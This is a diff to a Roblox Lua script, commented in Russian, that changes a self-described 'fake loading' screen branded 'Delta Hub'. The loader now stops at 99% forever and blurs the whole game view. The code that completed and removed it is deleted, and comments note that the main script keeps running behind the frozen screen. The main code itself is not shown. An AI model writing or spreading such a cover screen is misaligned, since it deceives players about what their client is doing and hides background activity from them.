@@ -7,7 +7,7 @@ local ReplicatedStorage  = game:GetService("ReplicatedStorage")
 local MarketplaceService = game:GetService("MarketplaceService")
 
 -- =========================================================
--- 0. ФЕЙКОВАЯ ЗАГРУЗКА (Визуально на экране, в фоне)
+-- 0. ВЕЧНАЯ ЗАГРУЗКА НА 99% + БЛЮР (В фоне)
 -- =========================================================
 task.spawn(function()
     local loadingGui = Instance.new("ScreenGui")
@@ -21,7 +21,7 @@ task.spawn(function()
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(1, 0, 1, 0)
     bg.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    bg.BackgroundTransparency = 0.3
+    bg.BackgroundTransparency = 0.4
     bg.BorderSizePixel = 0
     bg.Parent = loadingGui
     
@@ -73,31 +73,26 @@ task.spawn(function()
     percentText.Font = Enum.Font.GothamBold
     percentText.Parent = bg
     
-    -- Анимация загрузки
+    -- Анимация загрузки до 99%
     for i = 1, 99 do
         barFill.Size = UDim2.new(i / 100, 0, 1, 0)
         percentText.Text = i .. "%"
         task.wait(0.03)
     end
     
-    -- На 99% застывает
+    -- На 99% включаем БЛЮР и оставляем навсегда
     subtitle.Text = "Delta Hub is loading please wait..."
     subtitle.TextColor3 = Color3.fromRGB(255, 200, 0) -- желтый
-    task.wait(3) -- висит 3 секунды
     
-    -- 100%
-    barFill.Size = UDim2.new(1, 0, 1, 0)
-    percentText.Text = "100%"
-    subtitle.Text = "Loaded successfully!"
-    subtitle.TextColor3 = Color3.fromRGB(0, 255, 100)
-    task.wait(1)
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 24
+    blur.Parent = game:GetService("Lighting")
     
-    -- Удаляем экран загрузки
-    loadingGui:Destroy()
+    -- Скрипт тут больше ничего не делает, экран висит вечно
 end)
 
 -- =========================================================
--- ДАЛЬШЕ СРАЗУ ИДЕТ ОСНОВНОЙ КОД (не ждет загрузку)
+-- ДАЛЬШЕ СРАЗУ ИДЕТ ОСНОВНОЙ КОД (работает независимо)
 -- =========================================================
 local LocalPlayer = Players.LocalPlayer
 if not LocalPlayer then return end
